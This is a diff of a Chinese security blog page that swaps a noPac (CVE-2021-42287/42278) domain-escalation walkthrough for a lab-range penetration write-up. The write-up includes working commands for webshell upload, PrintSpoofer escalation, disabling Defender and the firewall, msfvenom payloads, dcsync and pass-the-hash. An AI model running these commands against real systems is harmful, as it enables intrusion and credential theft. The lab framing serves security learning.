@@ -4,9 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CVE-2021-42287与CVE-2021-42278组合拳, Hexo">
-    <meta name="description" content="CVE-2021-42287与CVE-2021-42278组合拳之前学习内网，用的基本都是一些比较老的洞和工具，这次来学习和分析一下两个比较新的洞，这两者组合起来在内网渗透中能发挥很大的威力
-在分析这两个洞之前，需要了解一些前置事实，ker">
+    <meta name="keywords" content="又一次艰难的靶场练习, Hexo">
+    <meta name="description" content="又一次艰难的靶场练习这个靶场内网部分还算可以，但是外网打点稍微有些困难。安全狗真是给我搞得心态炸裂。。。（本文没有详述所有过程，只是记录一下主要的攻击步骤和方法）
+
+这里直接给出拓扑图。
+WEN服务器首先我们对服务器进行端口扫描，nmap全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +22,7 @@
 
     
 
-    <title>CVE-2021-42287与CVE-2021-42278组合拳 | Hexo</title>
+    <title>又一次艰难的靶场练习 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -311,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CVE-2021-42287与CVE-2021-42278组合拳</h1>
+                    <h1 class="description center-align post-title">又一次艰难的靶场练习</h1>
                 </div>
             </div>
         </div>
@@ -453,7 +455,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-04-28
+                    2022-05-05
                 </div>
                 
 
@@ -477,103 +479,114 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="CVE-2021-42287与CVE-2021-42278组合拳"><a href="#CVE-2021-42287与CVE-2021-42278组合拳" class="headerlink" title="CVE-2021-42287与CVE-2021-42278组合拳"></a>CVE-2021-42287与CVE-2021-42278组合拳</h1><p>之前学习内网，用的基本都是一些比较老的洞和工具，这次来学习和分析一下两个比较新的洞，这两者组合起来在内网渗透中能发挥很大的威力</p>
-<p>在分析这两个洞之前，需要了解一些前置事实，kerberos认证流程，PAC特权认证（其实这本身也是kerberos认证过程的一部分，因为这个洞的产生原因就在PAC上，所以这里需要着重提一下。），以及S4U2Self协议。</p>
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>这些前置知识我在本文中只会简单的说一下（涉及到漏洞相关部分还是会着重讲一下），目的是为了帮大家（也是我自己）回顾一下，不会细说，毕竟这篇文章是来分析这两个洞的，如果每次都让这些前置知识占据大量篇幅，就会有种挂着羊头卖狗肉的感觉。</p>
-<h3 id="kerberos认证"><a href="#kerberos认证" class="headerlink" title="kerberos认证"></a>kerberos认证</h3><p>在内网渗透中，kerberos认证扮演着非常重要的角色，很多攻击方式都是基于kerberos完成的。这里简单叙述一下kerberos认证流程</p>
-<ul>
-<li>首先用户将 AS-REQ 数据包发送给 KDC 密钥分发中心，要对一个域进行身份验证。</li>
-<li>KDC 收到用户的请求后会验证用户的凭据，如果凭据有效，则返回 TGT 认购权证，该 TGT 认购权证用于以后的 ST 服务票据的请求。</li>
-<li>如果用户想通过身份认证访问某个服务的话，那么他需要发起票据授予请求，请求中包含 TGT 以及所请求服务的 SPN 服务主体名称。</li>
-<li>如果 TGT 有效并且没有过期，那么 TGS 会从 TGT 认购权证中提取信息创建一个用于访问目标服务的一个 ST 服务票据，该 ST 服务票据使用服务账户的凭据进行加密。然后，域控制器开始查找哪个帐户在 ServicedPrincipalName（SPN）字段中注册了所请求的 SPN。</li>
-<li>用户收到包含了服务票据的 TGS 响应数据包。</li>
-<li>最后，服务票据会转发给目标服务，然后使用服务账户的凭据进行解密。</li>
-</ul>
-<h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>PAC（Privilege Attribute Certificate），这是微软为了访问控制而引进的一个扩展，即特权访问证书。</p>
-<p>其实在上文我提过，PAC特权认证本身就是kerberos认证的一部分。这里我们先看一下上文对kerberos认证的描述，这个流程看起来没什么问题。但却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到ST（到这里其实这也是kerberoast攻击能够实施的原因），有了ST，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。而PAC的出现就是为了解决这个“what can i do”的问题。</p>
-<p>在一个正常的Kerberos认证流程中，KDC返回的TGT认购权证和ST服务票据中都是带有PAC的。如下图是AS-REQ&amp;AS-REP过程，可以清楚的看到，KDC的AS-REP消息中，PAC是包含在TGT认购权证中的。</p>
-<p><img src="/Downloads/DFDF7E46-70C2-461C-B614-B960D4847C60.png"></p>
-<p>那么，TGT认购权证中这个PAC是如何生成的呢？</p>
-<p>KDC在收到客户端发来的AS-REQ请求后，从请求中取出cname字段，然后查询活动目录数据库，找到sAMAccountName属性为cname字段的值的用户，用该用户的身份生成一个对应的PAC。</p>
-<p>接下来，在TGS-REQ&amp;TGS-REP请求ST服务票据的过程中，客户端带着上一步请求到的TGT认购权证请求访问指定服务的ST服务票据。KDC在验证客户端的身份后，会返回ST服务票据。如下图是TGS-REQ&amp;TGS-REP过程，可以清楚的看到，KDC的TGS-REP消息中，PAC是包含在ST服务票据中的。</p>
-<p><img src="/Downloads/D75C9C50-E91E-4D97-8E71-AABAB61D6F55.png"></p>
-<p>那么，ST服务票据中这个PAC是如何生成的呢？</p>
-<p>KDC收到TGT认购权证后，利用krbtgt密钥对其解密，然后取出PAC。然后验证PAC的签名，如果签名正确，则证明PAC未经过篡改。然后<strong>将TGT认购权证中的PAC直接拷贝到ST服务票据中。也就是说，ST服务票据中的PAC和TGT认购权证中的PAC是一致的</strong>。(但是这只是正常的TGS-REQ请求，如果是S4u2Self&amp;S4u2Proxy请求的话，ST服务票据中的PAC是重新生成的，请看下文)</p>
-<p>当然，如果TGT认购权证中没有PAC的话，KDC在拷贝PAC的时候，也是拷贝的空的，这就意味着ST服务票据中也没有PAC！</p>
-<p>后续服务端收到客户端发来的ST服务票据后，会用服务密钥对其进行解密，取出PAC里面关于用户的信息生成对应权限的访问令牌，然后对比服务的ACL进行鉴权。有权限访问的话，则返回该服务。无权限访问的话，则不返回服务。</p>
-<p>这里总结一下要点：<strong>在kerberos认证过程中，只要获得了某用户的TGT，不管该用户是否有访问某个服务的权限，都会凭借这个TGT获取一张该服务的ST，而服务端收到这张ST后，会取出其中的PAC并查询相应访问权限，如果有权限访问才会会返回该服务。</strong></p>
-<h3 id="S4u2Self协议"><a href="#S4u2Self协议" class="headerlink" title="S4u2Self协议"></a>S4u2Self协议</h3><p>如果你了解约束性委派的话，那么一定对这个协议不陌生。为了在Kerberos协议层面对委派的支持，微软对Kerberos协议扩展了两个自协议 S4u2self(Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )。S4u2self 可以代表任意用户请求针对自身的ST服务票据；S4u2Proxy可以用上一步获得的ST服务票据以用户的名义请求针对其它指定服务的ST服务票据。这里我们着重来看看S4u2self协议。</p>
-<p>S4u2self 可以代表任意用户请求针对自身的ST服务票据。当用户以其他方式：如NTLM认证、基于表单的认证等方式与Web服务进行认证后，用户是无法向Web服务器提供请求该服务的ST服务票据。因而服务器也无法进一步使用S4U2Proxy协议请求访问其他服务。S4U2Self协议便是解决该问题的方案，被配置为约束性委派的服务账号能够调用S4U2Self协议向KDC申请为任意用户请求访问自身的ST服务票据。（虽然S4U2Self协议允许服务代表用户向KDC请求一张访问自身服务的ST服务票据，但是此协议扩展不允许服务代表用户向KDC请求访问其他服务的ST服务票据。）</p>
-<p>这里需要强调的是，<strong>用S4u2self 请求的ST中的PAC，并非之前正常用kerberos协议认证中一样直接拷贝TGT中的PAC，这里的PAC是会重新生成的。</strong></p>
-<p>到这里，我们需要知道的一些基本前置知识就已经了解的差不多了，后面我们看一下这两个洞。</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>CVE-2021-42278，机器账户的名字一般来说应该以<code>$</code>结尾，但AD没有对域内机器账户名做验证。也就是说，可以存在用户名后面不带$的机器用户。</p>
-<p>CVE-2021-42287，与上述漏洞配合使用，该漏洞核心在于：<strong>当请求服务 ST 的账户没有被 KDC 找到时，KDC 会自动在尾部添加</strong> <code>**$**</code> <strong>重新搜索</strong>。创建与域控机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self用这张TGT申请TGS Ticket，由于此时我们已经更改名称，所以KDC是找不到这个账户的。此时KDC会在TGT中的client info中的name后面加一个$，加完后刚好不就是域控的机器账户名吗？域控会使用自己的密钥加密<code>TGS Ticket</code>（ST），并提供一个自己的<code>PAC</code>放入ST中，这样就产生了一个高权限的票据。</p>
-<p>这里有没有小伙伴想问为什么域控要用自己的密钥加密ST？S4U2self在约束性委派中本身就是申请一张访问自己的ST，所以这里请求的服务账户就是请求者自身，而根据上面的漏洞原理可知，此时的请求者已经被域控当成了它本身，所以域控会用自己密钥加密ST，不过这个并不重要，该漏洞形成最重要的原因还是域控向该服务票据内放入了一张自己的PAC，产生了一张高权限服务票据。</p>
-<p>这里用一个实例来描述一下这个过程：<br>在一个域控的机器用户名为DC$的域中，我们创建一个机器名为DC的机器账户（即DC$去掉$），并用这个机器账户去请求一个TGT，然后将其改名为newpc（只要不是DC都行）。然后我们再通过S4U2self用这张TGT申请TGS Ticket。此时KDC会去查询域内一个名为DC（毕竟那张TGT就是用名为DC的账户申请的）的账户，由于我们已经改了名字，它当然找不到了。然后KDC会在DC后面加一个‘$’并重新搜索，然后它会发现，加完后的‘DC$’不就是域控自己的机器账户吗。最后它就会用会使用自己的密钥加密<code>TGS Ticket</code>（ST），并提供一个自己的<code>PAC</code>放入ST中。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="noPac工具复现"><a href="#noPac工具复现" class="headerlink" title="noPac工具复现"></a>noPac工具复现</h3><p>noPac这个工具是可以一步到位进行攻击的，首先去下载这个工具并编译<a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
-<p>使用时如果报下图所示的错误</p>
-<p><img src="/Downloads/20220428213524.png"></p>
-<p>说明目标 .NET 版本与编译时 .NET 版本问题，改成 .NET 4.0进行编译就没有问题了：</p>
-<p><img src="/Downloads/20220429145953.png"></p>
-<p>不过如果是VS2022版本的话，默认是没有 .NET 4.0的，具体解决方式见该文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/ch_ccc/article/details/122948207">(34条消息) VS2022安装.Net Framework4.0方法_ch_ccc的博客-CSDN博客</a></p>
-<p>解决完上面的问题之后就可以开始使用工具进行攻击了，首先我们用这个工具进行一次漏洞验证：</p>
-<pre class="language-none"><code class="language-none">noPac.exe scan -domain whoamianony.org -user bunny -pass &quot;Bunny2021&quot;</code></pre>
+                <h1 id="又一次艰难的靶场练习"><a href="#又一次艰难的靶场练习" class="headerlink" title="又一次艰难的靶场练习"></a>又一次艰难的靶场练习</h1><p>这个靶场内网部分还算可以，但是外网打点稍微有些困难。安全狗真是给我搞得心态炸裂。。。（本文没有详述所有过程，只是记录一下主要的攻击步骤和方法）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/ReadTeam4/20211027171806.png"></p>
+<p>这里直接给出拓扑图。</p>
+<h2 id="WEN服务器"><a href="#WEN服务器" class="headerlink" title="WEN服务器"></a>WEN服务器</h2><p>首先我们对服务器进行端口扫描，nmap全端口扫描实在太慢了，这里用masscan</p>
+<pre class="language-none"><code class="language-none">masscan -p 1-65535 192.168.1.150 --rate&#x3D;1000</code></pre>
 
-<p><img src="/Downloads/20220429152612.png"></p>
-<p>得到这样的结果说明存在漏洞，接下来就可以打了</p>
-<pre class="language-none"><code class="language-none">noPac.exe -domain 域名 -user 域用户 -pass &quot;域用户据密码&quot; &#x2F;dc 域控名.域名（见漏洞验证的返回值） &#x2F;mAccount 创建的机器用户名 &#x2F;mPassword 该机器用户密码 &#x2F;service cifs &#x2F;ptt
+<p><img src="/Downloads/20220505144830.png"></p>
+<p>这里只会扫描出开放端口，不过得到开放端口后，我们就可以用nmap针对这些端口进行指纹扫描了</p>
+<pre class="language-none"><code class="language-none">nmap -p 21,80,999,6588,5985 -sS -sC -v -A 192.168.0.114 </code></pre>
 
-noPac.exe -domain whoamianony.org -user bunny -pass &quot;Bunny2021&quot; &#x2F;dc DC.whoamianony.org &#x2F;mAccount testpc &#x2F;mPassword testpassword &#x2F;service cifs &#x2F;ptt</code></pre>
+<p><img src="C:\Users\Icesoul\AppData\Roaming\Tencent\Users\1437565342\QQ\WinTemp\RichOle\9~~EW8A%I_}4UTK7%HEIPX2.png"></p>
+<p>80端口开着IISweb服务器，我们直接去访问（这里需要配置一个域名解析，否则访问不了）</p>
+<pre class="language-none"><code class="language-none">192.168.0.1 www.moonlab.com</code></pre>
 
-<p><img src="/Downloads/20220428213656.png"></p>
-<p>看见这个结果就说明攻击成功了。现在我们尝试访问域控C盘</p>
-<pre class="language-none"><code class="language-none">dir \\DC\c$</code></pre>
+<p><img src="/Downloads/20220505150131.png"></p>
+<p>主页是空白的，这里得用目录扫描器扫描一下后台，但是用扫描器的结果会现实字典中的所有目录都存在，应该是有安全狗之类的东西，看一下</p>
+<pre class="language-none"><code class="language-none">whatweb www.moonlab.com</code></pre>
 
-<p><img src="/Downloads/20220428213714.png"></p>
-<p>大功告成。</p>
-<h3 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h3><p>之前我们说过，noPac这个工具是一步到位的，用这个工具完全不知道中间发生了什么，所以接下来我们根据漏洞原理将该漏洞一步一步复现出来。</p>
-<h4 id="1-普通域用户创建机器账户"><a href="#1-普通域用户创建机器账户" class="headerlink" title="1 普通域用户创建机器账户"></a>1 普通域用户创建机器账户</h4><p>通过利用 <code>powermad.ps1</code> 新增机器帐号，下载地址：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
-<pre class="language-none"><code class="language-none">Set-ExecutionPolicy Bypass -Scope Process
-Import-Module .\Powermad.ps1
-# 新建机器账户为 newpc，密码设置为test2021
-New-MachineAccount -MachineAccount newpc -Domain whoamianony.org -DomainController DC.whoamianony.org -Verbose</code></pre>
+<p><img src="/Downloads/20220505150440.png"></p>
+<p>还真是，这里我无论把线程放低还是增加睡眠都没法扫出来，无奈上网上瞅了一眼wp，但是网上的扫描器也是增加睡眠，拿过来后仍然扫不出结果。无奈之下，不争气的我直接拿别人扫出来的结果去访问了</p>
+<p><img src="/Downloads/20220505152121.png"></p>
+<p>这里看到了登陆界面，还是老规矩，我们上网上查一查有哪些已经爆出来的漏洞。</p>
+<p>这里找到了一个后台密码重置漏洞，通过抓包修改设置完成攻击（这里图忘截了。。），最后带出密码</p>
+<p><img src="/Downloads/20220505152729.png"></p>
+<p>根据带出的密码尝试登陆。</p>
+<p><img src="/Downloads/20220505152942.png"></p>
+<p>这样我们已经登陆到了后台管理员界面，由于安全狗的存在，我们没法直接上传shell，只能找一些上传压缩包的地方上传：</p>
+<p><img src="/Downloads/20220505153141.png"></p>
+<p>从这里直接上传打包好的webshell就行，然后问题又来了，就算这样还是得做webshell的免杀，这有点触及到我的知识盲区了，尤其是aspx马，这里我们用冰蝎的马传上去看看。</p>
+<p><img src="/Downloads/20220505192409.png"></p>
+<p>连接成功，但是权限是真的低</p>
+<p><img src="/Downloads/20220505192427.png"></p>
+<p>所以先想办法提个权，我们选用打印机提权</p>
+<p><img src="/Downloads/image-20220505194143191.png"></p>
+<p>可以看到这里的SeImpersonatePrivilege已经启用，那直接提权就行，工具和用法见<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">itm4n&#x2F;PrintSpoofer: Abusing Impersonation Privileges on Windows 10 and Server 2019 (github.com)</a></p>
+<pre class="language-none"><code class="language-none">PrintSpoofer.exe -i -c &quot;whoami&quot;</code></pre>
 
-<p><img src="/Downloads/20220429155514.png"></p>
-<p>这里成功创建了一个新的机器用户。</p>
-<h4 id="2-清除SPN（不清除SPN会导致在使用S2U4self生产TS的时候报错）"><a href="#2-清除SPN（不清除SPN会导致在使用S2U4self生产TS的时候报错）" class="headerlink" title="2 清除SPN（不清除SPN会导致在使用S2U4self生产TS的时候报错）"></a>2 清除SPN（不清除SPN会导致在使用S2U4self生产TS的时候报错）</h4><p>我们看一下它是否存在spn服务</p>
-<pre class="language-none"><code class="language-none">setspn -Q *&#x2F;*</code></pre>
+<p><img src="/Downloads/20220505193204.png"></p>
+<p>可以成功提权，但这个只是单条命令执行的，我们希望拿到一个高权限的cmd</p>
+<pre class="language-none"><code class="language-none">PrintSpoofer.exe -i -c cmd</code></pre>
 
-<p><img src="/Downloads/20220428223556.png"></p>
-<p>看见了，我们的newpc是有的spn服务的，那么接下来要清除SPN，这里使用了PowerView.ps1，下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerSploit&#x2F;PowerView.ps1 at master · PowerShellMafia&#x2F;PowerSploit (github.com)</a></p>
-<pre class="language-none"><code class="language-none">Import-Module .\PowerView.ps1
-Set-DomainObject &quot;CN&#x3D;newpc,CN&#x3D;Computers,DC&#x3D;whoamianony,DC&#x3D;org&quot; -Clear &#39;serviceprincipalname&#39; -Verbose</code></pre>
+<p>一直没有反应，貌似是执行失败了。和msf的联动也没弹回来，那先查一下进程列表，用在线杀软识别找出正在运行的杀软。</p>
+<pre class="language-none"><code class="language-none">tasklist &#x2F;svc</code></pre>
 
-<p><img src="/Downloads/20220428223503.png"></p>
-<p>看到这个结果说明清除SPN成功了，我们再确认一下：</p>
-<p><img src="/Downloads/20220428223534.png"></p>
-<p>果然，刚才看到的newpc的SPN服务已经不见了。</p>
-<h4 id="3-重设机器名称为域控机器名"><a href="#3-重设机器名称为域控机器名" class="headerlink" title="3  重设机器名称为域控机器名"></a>3  重设机器名称为域控机器名</h4><pre class="language-none"><code class="language-none">Import-Module .\Powermad.ps1
-Set-MachineAccountAttribute -MachineAccount newpc -Value &quot;DC&quot; -Attribute samaccountname -Verbose</code></pre>
+<p><img src="/Downloads/20220505201416.png"></p>
+<p>windows defender。。。说实话这个杀软挺难过的，所以我们尝试换一种思路，关掉这个杀软，这里使用到了这个工具：<a target="_blank" rel="noopener" href="https://github.com/APTortellini/DefenderSwitch">https://github.com/APTortellini/DefenderSwitch</a></p>
+<p>直接配合之前的打印机提权漏洞一起使用</p>
+<pre class="language-none"><code class="language-none">PrintSpoofer.exe -i -c &quot;DefenderSwitch.exe -off&quot;</code></pre>
 
-<p><img src="/Downloads/20220428224014.png"></p>
-<h4 id="4-为机器账户请求TGT"><a href="#4-为机器账户请求TGT" class="headerlink" title="4 为机器账户请求TGT"></a>4 为机器账户请求TGT</h4><p>这里使用Rubeus请求TGT，这个工具讲kerberoast攻击时提到过，下载地址：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
-<pre class="language-none"><code class="language-none">Rubeus.exe asktgt &#x2F;user:DC &#x2F;password:test2021(创建用户时设置的密码) &#x2F;domian:whoamianony.org &#x2F;dc:DC.whoamianony.org &#x2F;nowrap &gt; test.txt(我用的这个win7对命令行的复制很不友好，所以就把结果导入进文件里)</code></pre>
+<p><img src="/Downloads/20220505202303.png"></p>
+<p>执行成功，再次使用在线杀软识别</p>
+<p><img src="/Downloads/20220505202421.png"></p>
+<p>已经成功关闭Windows Defender。 然后用msf生成木马上传，并监听，冰蝎这边用同上的方式配合打印机提权执行木马</p>
+<pre class="language-none"><code class="language-none">PrintSpoofer.exe -i -c &quot;shell.exe&quot;</code></pre>
 
-<p><img src="/Downloads/20220429162115.png"></p>
-<h4 id="5-再次更改机器账户的sAMAccountName"><a href="#5-再次更改机器账户的sAMAccountName" class="headerlink" title="5 再次更改机器账户的sAMAccountName"></a>5 再次更改机器账户的sAMAccountName</h4><p>将机器账户的sAMAccountName更改为其他名字，改回原来属性，或者其他的，不与步骤3重复即可。</p>
-<pre class="language-none"><code class="language-none">Set-MachineAccountAttribute -MachineAccount newpc -Value &quot;newpc2&quot; -Attribute samaccountname -Verbose</code></pre>
+<p><img src="/Downloads/20220505203105.png"></p>
+<p>回连成功。</p>
+<p>我这边msf和CS的联动一直有问题，所以这个session没法传给CS，所以只好再用CS生成一个木马上传,然后msf执行</p>
+<p><img src="/Downloads/20220505204833.png"></p>
+<p>已经弹了回来。</p>
+<h2 id="Windows-Server-2012"><a href="#Windows-Server-2012" class="headerlink" title="Windows Server 2012"></a>Windows Server 2012</h2><p>然后扫描，毕竟我认为CS的扫描器还是不错的。只扫描内网网段即可</p>
+<p><img src="/Downloads/20220505205041.png"></p>
+<p>这里扫到了内网的另外一台主机和其开放的端口</p>
+<p><img src="/Downloads/20220505205959.png"></p>
+<p><img src="/Downloads/20220505210015.png"></p>
+<p>接下来我们挂上代理去访问</p>
+<p><img src="/Downloads/20220505210435.png"></p>
+<p>又是一个信呼oa，我们之前打红日靶场的时候就打过，这次用一样的工具再打一次就行了，见<a target="_blank" rel="noopener" href="https://icesoula.github.io/2022/04/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-7/#DC%E5%92%8CPC2">记一次靶场练习-VulnStack-7 | Hexo (icesoula.github.io)</a></p>
+<p>过程这里我就忽略了，这次上传的是个冰蝎的马，直接用冰蝎去连接</p>
+<p><img src="/Downloads/20220505210810.png"></p>
+<p>不仅连接上了，还是个高权限。</p>
+<p>和刚才一样，我们查一下它有哪些杀软</p>
+<p><img src="/Downloads/20220505211015.png"></p>
+<p>只有一个360，那就比较好过了，不过由于防火墙开着导致我们挂上代理也无法访问到，所以我们需要先关上它的防火墙。</p>
+<pre class="language-none"><code class="language-none">netsh advfirewall set allprofiles state off </code></pre>
 
-<p><img src="/Downloads/20220428224547.png"></p>
-<h4 id="6-通过S4U2self协议向DC请求TGS票据"><a href="#6-通过S4U2self协议向DC请求TGS票据" class="headerlink" title="6 通过S4U2self协议向DC请求TGS票据"></a>6 通过S4U2self协议向DC请求TGS票据</h4><pre class="language-none"><code class="language-none">Rubeus.exe s4u &#x2F;self &#x2F;impersonateuser:&quot;Administrator&quot; &#x2F;altservice:&quot;ldap&#x2F;DC.whoamianony.org&quot; &#x2F;dc:&quot;DC.whoamianony.org&quot; &#x2F;ptt &#x2F;ticket:上面获取到的tgt票据内容</code></pre>
+<p><img src="/Downloads/20220505211457.png"></p>
+<p>成功，此时我们挂代理去ping一下</p>
+<p><img src="/Downloads/20220505211814.png"></p>
+<p>能ping同，那就用正向马打就行了，但是这里需要做个免杀，这里我用的一个go的加载器直接在目标机器上加载十六进制文件。</p>
+<pre class="language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;192.168.0.128 LPORT&#x3D;4444 -f hex -o shell.hex</code></pre>
 
-<p><img src="/Downloads/20220429162951.png"></p>
-<p>（图有点大，没截全）这样就成功了。</p>
-<p>尝试访问域控C盘</p>
-<p><img src="/Downloads/20220428230712.png"></p>
-<p>成功</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/FHLZLHQ/article/details/121964692">(34条消息) 域控漏洞-CVE-2021-42287&amp;42278复现_君行路V的博客-CSDN博客_域控漏洞</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/317773.html">域内提权漏洞CVE-2021-42287与CVE-2021-42278原理分析 - FreeBuf网络安全行业门户</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/263910#h3-5">https://www.anquanke.com/post/id/263910#h3-5</a></p>
+<p><img src="/Downloads/20220505220622.png"></p>
+<p>msf成功上线</p>
+<h2 id="Windows-Server-2016-域控"><a href="#Windows-Server-2016-域控" class="headerlink" title="Windows Server 2016(域控)"></a>Windows Server 2016(域控)</h2><p> 由于kiwi模块没抓到明文密码，所以先尝试抓令牌试试</p>
+<pre class="language-none"><code class="language-none">load incognito
+list_tokens -u    #查看当前主机内存中的令牌</code></pre>
+
+<p><img src="/Downloads/20220506145310.png"></p>
+<p>系统中有域管的令牌，那我们直接窃取</p>
+<pre class="language-none"><code class="language-none">impersonate_token &quot;ATTACK\Administrator&quot;</code></pre>
+
+<p><img src="/Downloads/20220506145639.png"></p>
+<p>窃取的确是成功了，但是我们无法得到一个域管权限的shell，所以只能换种方式，这里用msf自带的kiwi模块中的dcsync来获取域管哈希。</p>
+<pre class="language-none"><code class="language-none">load kiwi
+dcsync administrator</code></pre>
+
+<p><img src="/Downloads/20220506150137.png"></p>
+<p>有了hash后，就可以进行hash传递了。</p>
+<pre class="language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec
+set rhosts 10.10.0.165
+set smbuser administrator
+set smbpass 00000000000000000000000000000000:f4466fca31070e080a7da76ac6d078c0  &#x2F;&#x2F; 完整的Administrator用户的Hash，即LM Hash:NT Hash，LM Hash不知道的话可以用0补齐
+set smbdomain attack.local
+run</code></pre>
+
+<p><img src="/Downloads/20220505142854.png"></p>
+<p>拿下</p>
 
                 
             </div>
@@ -600,7 +613,7 @@ Set-MachineAccountAttribute -MachineAccount newpc -Value &quot;DC&quot; -Attribu
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/04/28/CVE-2021-42287%E4%B8%8ECVE-2021-42278%E7%BB%84%E5%90%88%E6%8B%B3/">http://example.com/2022/04/28/CVE-2021-42287%E4%B8%8ECVE-2021-42278%E7%BB%84%E5%90%88%E6%8B%B3/</a>
+                    <a href="http://example.com/2022/05/05/%E5%8F%88%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">http://example.com/2022/05/05/%E5%8F%88%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -809,9 +822,10 @@ Set-MachineAccountAttribute -MachineAccount newpc -Value &quot;DC&quot; -Attribu
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2022/05/05/%E5%8F%88%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
                     <div class="card-image">
@@ -829,9 +843,9 @@ Set-MachineAccountAttribute -MachineAccount newpc -Value &quot;DC&quot; -Attribu
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-05
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -844,6 +858,7 @@ Set-MachineAccountAttribute -MachineAccount newpc -Value &quot;DC&quot; -Attribu
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -854,13 +869,13 @@ Set-MachineAccountAttribute -MachineAccount newpc -Value &quot;DC&quot; -Attribu
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/04/15/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/">
+                <a href="/2022/04/28/CVE-2021-42287%E4%B8%8ECVE-2021-42278%E7%BB%84%E5%90%88%E6%8B%B3/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="内网横向移动基础总结">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="CVE-2021-42287与CVE-2021-42278组合拳">
                         
-                        <span class="card-title">内网横向移动基础总结</span>
+                        <span class="card-title">CVE-2021-42287与CVE-2021-42278组合拳</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -871,7 +886,7 @@ Set-MachineAccountAttribute -MachineAccount newpc -Value &quot;DC&quot; -Attribu
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-28
                             </span>
                         <span class="publish-author">
                             
